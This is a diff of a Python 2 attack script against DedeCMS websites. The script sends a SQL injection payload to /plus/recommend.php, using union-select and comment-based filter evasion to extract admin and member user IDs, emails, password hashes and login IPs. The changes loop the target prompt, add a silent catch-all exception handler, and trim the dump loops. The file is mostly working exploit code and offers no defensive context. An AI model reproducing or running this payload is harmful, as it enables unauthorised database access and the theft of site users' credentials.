@@ -26,6 +26,9 @@ def getAdminHash(url,i):
         print "Precess interrupted by user."
         sys.exit(-1)
 
+    except :
+        #sys.exit(-2)
+        print "no exp"
 
 def getMemberHash(url,i):
     urls = url+"/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@%60\%27%60%20/*!50000union*//*!50000select*/1,2,3,%28select%20CONCAT%280x7c,userid,0x7c,email,0x7c,pwd,0x7c,loginip%29+from+%60%23@__member%60%20limit+"+str(i)+",1%29,5,6,7,8,9%23@%60\%27%60+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=111"
@@ -52,16 +55,18 @@ def getMemberHash(url,i):
 
 
 if __name__ == "__main__":
-    url = raw_input("input dede site:")
+    while True:
+        url = raw_input("input dede site:")
+        #url = sys.argv[1]
 
-    if "http://" not in url:
-        url="http://%s" % url
+        if "http://" not in url:
+            url="http://%s" % url
 
-    print "Admin"
-    for i in xrange(0,20):
-        getAdminHash(url,i)
-    print "Member"
-    for i in xrange(0,2000):
-        getMemberHash(url,i)
+        print "Admin"
+        for i in xrange(0,2):
+            getAdminHash(url,i)
+    #print "Member"
+    #for i in xrange(0,200):
+    #    getMemberHash(url,i)
 
 
